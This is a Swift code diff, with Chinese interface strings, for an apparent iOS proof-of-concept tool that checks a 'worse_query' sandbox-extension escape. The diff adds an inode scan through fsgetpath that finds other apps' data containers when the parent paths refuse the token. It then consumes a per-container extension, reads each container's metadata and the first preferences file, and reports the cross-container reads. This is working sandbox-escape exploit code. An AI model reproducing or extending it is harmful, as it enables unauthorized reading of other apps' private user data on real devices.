@@ -24,6 +24,7 @@ enum Diagnostics {
         let containerID: String
         let metadataID: String
         let readBytes: Int
+        let metadataRead: Bool
         let error: String
     }
 
@@ -38,17 +39,26 @@ enum Diagnostics {
         let postErrno: Int32
         let entryCount: Int
         let children: [ChildResult]
+        let scanChildren: Int
+        let scanReads: Int
 
-        var childReads: Int { children.filter { $0.readBytes > 0 }.count }
+        var childReads: Int {
+            children.filter { $0.readBytes > 0 || $0.metadataRead }.count
+        }
 
         var status: Status {
             if handle >= 0 && postListable { return .pass }
+            if scanReads > 0 { return .pass }
+            if scanChildren > 0 { return .warn }
             if handle >= 0 { return .warn }
             if !exists && handle == -255 { return .skip }
             return .fail
         }
 
         var summaryLine: String {
+            if scanChildren > 0 {
+                return "父路径 \(handle) · inode 扫描 \(scanChildren) 个子容器 · 可读 \(scanReads)"
+            }
             var parts: [String] = ["handle \(handle)"]
             parts.append(preListable ? "消费前可读" : "消费前 EPERM")
             if handle >= 0 {
@@ -81,21 +91,28 @@ enum Diagnostics {
         let label: String
         let path: String
         let deep: Bool
+        let scanFallback: Bool
     }
 
     private static let targets: [Target] = [
         Target(label: "AppGroup 根目录",
-               path: "/private/var/mobile/Containers/Shared/AppGroup", deep: true),
+               path: "/private/var/mobile/Containers/Shared/AppGroup",
+               deep: true, scanFallback: false),
         Target(label: "App 数据容器",
-               path: "/private/var/mobile/Containers/Data/Application", deep: true),
+               path: "/private/var/mobile/Containers/Data/Application",
+               deep: true, scanFallback: true),
         Target(label: "InternalDaemon 容器",
-               path: "/private/var/mobile/Containers/Data/InternalDaemon", deep: true),
+               path: "/private/var/mobile/Containers/Data/InternalDaemon",
+               deep: true, scanFallback: true),
         Target(label: "PluginKitPlugin 容器",
-               path: "/private/var/mobile/Containers/Data/PluginKitPlugin", deep: true),
+               path: "/private/var/mobile/Containers/Data/PluginKitPlugin",
+               deep: true, scanFallback: true),
         Target(label: "SystemGroup (iOS 27)",
-               path: "/private/var/containers/Shared/SystemGroup", deep: true),
+               path: "/private/var/containers/Shared/SystemGroup",
+               deep: true, scanFallback: true),
         Target(label: "System 数据 (iOS 27)",
-               path: "/private/var/containers/Data/System", deep: false),
+               path: "/private/var/containers/Data/System",
+               deep: false, scanFallback: false),
     ]
 
     static func run(group: String) -> Report {
@@ -212,6 +229,8 @@ enum Diagnostics {
         var listings = 0
         var deepReads = 0
         var preDenied = 0
+        var scanTotal = 0
+        var scanCache: [String: [String]]?
 
         for (i, target) in targets.enumerated() {
             emit("")
@@ -247,6 +266,8 @@ enum Diagnostics {
             var post: [String]?
             var postErr: Int32 = 0
             var children: [ChildResult] = []
+            var scanChildren = 0
+            var scanReads = 0
 
             if handle >= 0 {
                 handles += 1
@@ -270,7 +291,39 @@ enum Diagnostics {
                 worse_query_release(handle)
                 emit("    released \(handle)")
             } else {
-                emit("    [FAIL] no extension")
+                emit("    [FAIL] parent extension \(handle) \(code(handle))")
+
+                // On iOS 27.0.1 the four container parents refuse the token.
+                // Find their direct children through fsgetpath instead, then
+                // consume a per-container extension like WQFiles does.
+                if target.scanFallback {
+                    if scanCache == nil {
+                        let baseline = wq_baseline_inode()
+                        let maxInode = baseline > 0 ? baseline + 100_000 : 0
+                        let parents = targets.filter { $0.scanFallback }.map { $0.path }
+                        emit("    fsgetpath scan: baseline \(baseline), max \(maxInode), 25s budget, \(parents.count) parents")
+                        if maxInode > 0 {
+                            scanCache = (wq_scan_children(parents, maxInode, 4, 25.0)
+                                         as? [String: [String]]) ?? [:]
+                        } else {
+                            scanCache = [:]
+                        }
+                    }
+
+                    let paths = scanCache?[target.path] ?? []
+                    scanChildren = paths.count
+                    scanTotal += scanChildren
+                    emit("    fsgetpath: \(scanChildren) child path(s)")
+
+                    if !paths.isEmpty {
+                        let probe = probeScanned(paths: paths,
+                                                 group: effectiveGroup,
+                                                 emit: emit)
+                        scanReads = probe.reads
+                        children = probe.results
+                        deepReads += probe.reads
+                    }
+                }
             }
 
             if post != nil { listings += 1 }
@@ -284,12 +337,14 @@ enum Diagnostics {
                                         postListable: post != nil,
                                         postErrno: postErr,
                                         entryCount: post?.count ?? 0,
-                                        children: children))
+                                        children: children,
+                                        scanChildren: scanChildren,
+                                        scanReads: scanReads))
         }
 
         // MARK: Stage 3/4 summary
         let stage3Status: Status
-        if handles > 0 && listings > 0 {
+        if (handles > 0 && listings > 0) || scanTotal > 0 {
             stage3Status = .pass
         } else if handles > 0 {
             stage3Status = .warn
@@ -298,13 +353,13 @@ enum Diagnostics {
         }
         stages.append(Stage(title: "目标路径逃逸",
                             status: stage3Status,
-                            detail: "\(handles)/\(targets.count) 个目标拿到 extension，\(listings) 个目录可读"))
+                            detail: "\(handles)/\(targets.count) 个父路径拿到 extension，\(listings) 个目录可读，inode 扫描补充 \(scanTotal) 个子容器"))
 
         let stage4Status: Status = deepReads > 0 ? .pass : (handles > 0 ? .warn : .skip)
         stages.append(Stage(title: "跨容器真实读取",
                             status: stage4Status,
                             detail: deepReads > 0
-                                ? "\(deepReads) 个其他 App 容器的文件读取成功"
+                                ? "\(deepReads) 个跨容器文件/元数据读取成功"
                                 : "没有跨容器文件读取成功"))
 
         // MARK: Verdict
@@ -358,46 +413,77 @@ enum Diagnostics {
         var out: [ChildResult] = []
 
         for child in children {
-            let childPath = root + "/" + child
-            let h = worse_query(childPath, group, false, true)
-            if h < 0 {
-                emit("      child \(child): extension failed \(h) \(code(h))")
-                out.append(ChildResult(name: child, containerID: "?", metadataID: "?",
-                                       readBytes: 0, error: "ext \(h)"))
-                continue
-            }
-
-            let cid = wq_container_id(childPath) ?? "?"
-            let meta = wq_container_metadata(childPath)
-            let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"
-
-            var readBytes = 0
-            var errText = ""
-            var prefErr: Int32 = 0
-            let prefs = wq_listdir(childPath + "/Library/Preferences", &prefErr, 8)
-
-            if let prefs = prefs, let first = prefs.first {
-                var readErr: Int32 = 0
-                if let data = wq_readfile(childPath + "/Library/Preferences/" + first,
-                                          4096, &readErr) {
-                    readBytes = data.count
-                    emit("      child \(child): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B")
-                } else {
-                    errText = "read errno \(readErr)"
-                    emit("      child \(child): ext=ok id=\(cid) meta=\(mid) \(errText)")
-                }
-            } else {
-                errText = "prefs errno \(prefErr)"
-                emit("      child \(child): ext=ok id=\(cid) meta=\(mid) \(errText)")
-            }
-
-            if readBytes > 0 { reads += 1 }
-            out.append(ChildResult(name: child, containerID: cid, metadataID: mid,
-                                   readBytes: readBytes, error: errText))
-            worse_query_release(h)
+            let result = probeContainer(path: root + "/" + child,
+                                        name: child,
+                                        group: group,
+                                        emit: emit)
+            if result.readBytes > 0 || result.metadataRead { reads += 1 }
+            out.append(result)
         }
 
         return (reads, out)
+    }
+
+    /// Children discovered through fsgetpath: consume each one separately.
+    private static func probeScanned(paths: [String],
+                                     group: String,
+                                     emit: (String) -> Void) -> (reads: Int, results: [ChildResult]) {
+        var reads = 0
+        var results: [ChildResult] = []
+
+        for path in paths {
+            let name = (path as NSString).lastPathComponent
+            let result = probeContainer(path: path,
+                                        name: name,
+                                        group: group,
+                                        emit: emit)
+            if result.readBytes > 0 || result.metadataRead { reads += 1 }
+            results.append(result)
+        }
+
+        return (reads, results)
+    }
+
+    private static func probeContainer(path: String,
+                                       name: String,
+                                       group: String,
+                                       emit: (String) -> Void) -> ChildResult {
+        let h = worse_query(path, group, false, true)
+        if h < 0 {
+            emit("      child \(name): extension failed \(h) \(code(h))")
+            return ChildResult(name: name, containerID: "?", metadataID: "?",
+                               readBytes: 0, metadataRead: false, error: "ext \(h)")
+        }
+
+        let cid = wq_container_id(path) ?? "?"
+        let meta = wq_container_metadata(path)
+        let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"
+        let metadataRead = (meta != nil)
+
+        var readBytes = 0
+        var errText = ""
+        var prefErr: Int32 = 0
+        let prefs = wq_listdir(path + "/Library/Preferences", &prefErr, 8)
+
+        if let prefs = prefs, let first = prefs.first {
+            var readErr: Int32 = 0
+            if let data = wq_readfile(path + "/Library/Preferences/" + first,
+                                      4096, &readErr) {
+                readBytes = data.count
+                emit("      child \(name): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B")
+            } else {
+                errText = "read errno \(readErr)"
+                emit("      child \(name): ext=ok id=\(cid) meta=\(mid) \(errText)")
+            }
+        } else {
+            errText = "prefs errno \(prefErr)"
+            emit("      child \(name): ext=ok id=\(cid) meta=\(mid) prefs=\(prefs?.count ?? 0) \(errText)")
+        }
+
+        worse_query_release(h)
+        return ChildResult(name: name, containerID: cid, metadataID: mid,
+                           readBytes: readBytes, metadataRead: metadataRead,
+                           error: errText)
     }
 
     private static func code(_ h: Int64) -> String {
@@ -439,13 +525,17 @@ extension Diagnostics.TargetResult {
 }
 
 extension Diagnostics.Report {
+    var scanChildrenTotal: Int {
+        targets.reduce(0) { $0 + $1.scanChildren }
+    }
+
     var shareText: String {
         var s = "worse_query 验证结论\n"
         s += "\(headline)\n"
         s += "\(subheadline)\n"
         s += "iOS \(iosVersion) | \(device)\n"
         s += "App Group: \(groupIdentifier)\n"
-        s += "extension \(handles)/\(targets.count) | 目录可读 \(listings) | 跨容器读取 \(deepReads)\n\n"
+        s += "extension \(handles)/\(targets.count) | 目录可读 \(listings) | 跨容器读取 \(deepReads) | inode 子容器 \(scanChildrenTotal)\n\n"
 
         for t in targets {
             let pre = t.preListable ? "可读" : "EPERM(\(t.preErrno))"
@@ -453,6 +543,9 @@ extension Diagnostics.Report {
             s += "[\(t.statusWord)] \(t.label)\n"
             s += "  \(t.path)\n"
             s += "  handle=\(t.handle) 消费前=\(pre) 消费后=\(post) 子读取=\(t.childReads)\n"
+            if t.scanChildren > 0 {
+                s += "  inode 扫描=\(t.scanChildren) 个子容器 可读=\(t.scanReads)\n"
+            }
         }
 
         s += "\n--- 原始日志 ---\n\(rawLog)\n"
